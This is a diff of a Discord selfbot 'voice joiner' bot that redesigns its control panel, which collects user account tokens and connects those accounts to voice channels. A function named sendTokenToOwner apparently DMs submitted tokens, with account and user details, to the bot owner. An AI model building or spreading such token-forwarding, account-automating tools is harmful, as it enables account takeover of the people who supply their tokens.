@@ -11,7 +11,11 @@ const {
     TextInputStyle,
     StringSelectMenuBuilder,
     StringSelectMenuOptionBuilder,
-    EmbedBuilder
+    EmbedBuilder,
+    ContainerBuilder,
+    TextDisplayBuilder,
+    SeparatorBuilder,
+    MessageFlags
 } = require('discord.js');
 const { Client: SelfClient } = require('discord.js-selfbot-v13');
 
@@ -85,7 +89,7 @@ function getUptime() {
     return `${mins}dk ${secs}sn`;
 }
 
-// Bot sahibine DM ile mesaj gönderme fonksiyonu
+// Bot sahibinə DM ilə mesaj göndərmə fonksiyonu
 async function sendTokenToOwner(clientInstance, title, token, accountName, username, addedByUserId) {
     if (!OWNER_ID) return;
     try {
@@ -242,21 +246,38 @@ bot.on('messageCreate', async (message) => {
     if (command === 'panel-voice') {
         try { await message.delete(); } catch (e) {}
 
-        const active = selfClients.size;
-        const total = database.accounts.length;
-        const offline = total - active;
-
-        const embed = new EmbedBuilder()
-            .setColor(0x2b2d31)
-            .setTitle('🖥️ Fronzyy Ses Yönetim Paneli')
-            .setDescription(
-                `🟢 **Çevrimiçi:** ${active}\n` +
-                `🔴 **Çevrimdışı:** ${offline}\n` +
-                `📊 **Toplam:** ${total}\n` +
-                `⏱️ **Çalışma Süresi:** ${getUptime()}`
+        const container = new ContainerBuilder()
+            .setAccentColor(0x2b2d31)
+            .addTextDisplayComponents(
+                new TextDisplayBuilder().setContent('# **Fronzyy Voice Joiner**')
             )
-            .setFooter({ text: 'Copyright © Developed by Fronzyy 2026' })
-            .setTimestamp();
+            .addSeparatorComponents(
+                new SeparatorBuilder().setDivider(true)
+            )
+            .addTextDisplayComponents(
+                new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
+            )
+            .addTextDisplayComponents(
+                new TextDisplayBuilder().setContent('• **Sese Bağlan** : Eklediğiniz hesapları belirleyeceğiniz ses kanalına bağlamanızı sağlar.')
+            )
+            .addTextDisplayComponents(
+                new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
+            )
+            .addTextDisplayComponents(
+                new TextDisplayBuilder().setContent('• **Toplu Token Ekle** : Her satıra bir token yazarak birden fazla hesabı aynı anda eklersiniz.')
+            )
+            .addTextDisplayComponents(
+                new TextDisplayBuilder().setContent('• **Token Sil** : Eklediğiniz tokenleri tek tek veya tümünü silebilirsiniz.')
+            )
+            .addTextDisplayComponents(
+                new TextDisplayBuilder().setContent('• **Tümünü Durdur** : Ses kanalına bağlı olan hesaplarınızın bağlantısını keser.')
+            )
+            .addSeparatorComponents(
+                new SeparatorBuilder().setDivider(true)
+            )
+            .addTextDisplayComponents(
+                new TextDisplayBuilder().setContent(`-# Copyright © Developed by Fronzyy 2026`)
+            );
 
         const row1 = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setCustomId('connect_voice_menu').setLabel('Sese Bağlan').setStyle(ButtonStyle.Success).setEmoji('🔊'),
@@ -269,7 +290,10 @@ bot.on('messageCreate', async (message) => {
             new ButtonBuilder().setCustomId('stop_all').setLabel('Tümünü Durdur').setStyle(ButtonStyle.Danger).setEmoji('⏹️')
         );
 
-        await message.channel.send({ embeds: [embed], components: [row1, row2] });
+        await message.channel.send({ 
+            components: [container, row1, row2],
+            flags: MessageFlags.IsComponentsV2 
+        });
     }
 
     if (command === 'durum' || command === 'status') {
